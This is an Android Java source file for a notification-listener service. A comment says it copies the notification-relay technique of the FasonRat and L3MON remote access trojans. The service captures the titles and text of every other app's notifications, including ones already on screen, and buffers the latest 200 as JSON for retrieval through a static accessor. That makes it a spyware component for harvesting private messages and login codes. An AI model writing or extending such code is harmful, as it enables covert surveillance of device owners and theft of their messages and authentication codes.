package com.zeko.droid;

import android.app.Notification;
import android.content.Context;
import android.os.Build;
import android.provider.Settings;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.text.TextUtils;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.LinkedList;
import java.util.List;

/**
 * Đọc notification (kỹ thuật giống NotificationRelayService của FasonRat + L3MON):
 * bắt onNotificationPosted, lấy EXTRA_TITLE/EXTRA_TEXT/EXTRA_BIG_TEXT, giữ 200 cái gần nhất.
 */
public class ZkNotifService extends NotificationListenerService {

    public static volatile ZkNotifService INSTANCE;
    private static final int MAX = 200;
    private static final LinkedList<JSONObject> RECENT = new LinkedList<>();

    public static boolean enabled(Context ctx) {
        try {
            String flat = Settings.Secure.getString(ctx.getContentResolver(), "enabled_notification_listeners");
            return flat != null && flat.contains(ctx.getPackageName());
        } catch (Throwable t) {
            return false;
        }
    }

    public static JSONArray recent(int limit) {
        JSONArray arr = new JSONArray();
        synchronized (RECENT) {
            int start = Math.max(0, RECENT.size() - limit);
            for (int i = RECENT.size() - 1; i >= start; i--) arr.put(RECENT.get(i));
        }
        return arr;
    }

    @Override public void onListenerConnected() {
        super.onListenerConnected();
        INSTANCE = this;
        try {
            StatusBarNotification[] active = getActiveNotifications();
            if (active != null) for (StatusBarNotification sbn : active) process(sbn);
        } catch (Throwable ignored) { }
    }

    @Override public void onNotificationPosted(StatusBarNotification sbn) {
        process(sbn);
    }

    private void process(StatusBarNotification sbn) {
        try {
            if (sbn == null || sbn.getNotification() == null) return;
            if (sbn.getPackageName().equals(getPackageName())) return;

            Notification n = sbn.getNotification();
            android.os.Bundle ex = n.extras;
            String title = str(ex.getCharSequence(Notification.EXTRA_TITLE));
            String text = str(ex.getCharSequence(Notification.EXTRA_TEXT));
            String big = str(ex.getCharSequence(Notification.EXTRA_BIG_TEXT));
            if (text.isEmpty()) text = big;
            if (title.isEmpty() && text.isEmpty()) return;

            JSONObject o = new JSONObject();
            o.put("app", sbn.getPackageName());
            o.put("title", title);
            o.put("text", text);
            o.put("time", new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm", java.util.Locale.US)
                    .format(new java.util.Date(sbn.getPostTime())));
            synchronized (RECENT) {
                RECENT.addLast(o);
                while (RECENT.size() > MAX) RECENT.removeFirst();
            }
        } catch (Throwable ignored) { }
    }

    private static String str(CharSequence cs) {
        return cs == null ? "" : cs.toString();
    }

    @Override public void onNotificationRemoved(StatusBarNotification sbn) { }
}
